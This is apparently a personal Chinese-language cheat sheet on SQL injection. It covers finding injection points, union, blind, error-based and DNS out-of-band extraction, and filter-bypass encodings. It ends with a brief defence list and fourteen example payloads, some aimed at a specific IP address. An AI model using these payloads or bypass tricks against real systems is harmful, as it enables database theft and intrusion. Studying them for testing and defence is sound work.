如何开始:
1.明确入口:
	一般都在接收用户输入的地方，常见的登录注册接口，评论提交接口等。位置一般以参数url params Post params为主，也有headers(host, ua, referer等)，cookie等。
2.查找注入点：
	1.输入携带引号，查看是否异常
	2.逻辑操作符and or 是否生效
	3.数字运算符是否生效+ -
	4.字符串拼接是否生效'f' 'o' 'o'
	5.内置函数是否生效
	6.查询结构是否生效 union select, order by
3.确定数据库类型：
4.探测：
	1.union select 
	一般是探测数据库信息，比如database(), user()等确定基本信息，再获取目标的数据库名，表名等。information_schema 关键的数据库，存储了许多基本配置及相关信息，
	UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
	2.盲注
	在注入点无回显的场景，根据响应的正确执行与否来判断注入是否成功，即条件式响应，盲注。
	一般分为两类：
		1.布尔盲注
			构造有效与无效的SQL语句，观察响应是否有异同，来判断是否可进行盲注。
			AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
			
		2.时间盲注
			根据语句执行时间(server 响应时间)判断语句是否执行成功,一般用sleep(), benchmark()
	3.报错
	根据报错信息判断是否存在潜在的注入点
	4.爆破
	上述步骤明确注入点和基本信息后，采用爆破的方法获取完整的数据库名，表名等。一般用hex(),unhex(),ascii(),char(),concat()等函数
5.绕过：
	1.引号绕过
		1.0x61646D696E;
		2.char(), ascii(),hex(),unhex()
	2.字符黑名单绕过
		1.引号空格分割'a' 'd' 'm' 'I' 'n'
		2.concat() concat_ws() group_concat()
		3.行间注释(语句截断)
		4.行内注释(空格替换)
		
	3.字符编码绕过
		1.大小写
		2.hex
		3.urlencode
		4.base64
		5.宽字节
		6.组合编码
		7.unicode及特殊unicode字符
	4.使用条件语句
		CASE, IF(), IFNULL(), NULLIF()
	5.带外通道(DNSLOG Injection)
		当无回显时，通过DNSLOG注入获取相关执行成功与否等信息。配合load_file使用
		
6.防御：
	1.输入过滤
	2.参数化查询
	3.语法解析
7.工具：
sqlmap & burpsuit

示例：

	1. 100.94.13.181?a=1' || '1'&'1
	2. 100.94.13.181?a=1' or '1'&'1
	3.  select *,NULL from information_schema.USER_PRIVILEGES as U where PRIVILEGE_TYPE='1' or 0x73656c656374
	4. 100.94.13.181?a=1' or 0x61646D696E'
	5. 100.94.13.181?a=1' or 0x61646D696E#
	6. a=1' or repeat('',1) or repeat('1', 1);#
	7. a=1' or 2+1;#
	8. a=1' or!!2+1;#
	9. a=1' or~~2+1;#
	10. a=1' or!!0x21;#
	11. a=1' or~~0x21;#
	12. a='='
	13. a=foo'='foo
	14. a=1'%00or%001;#
	
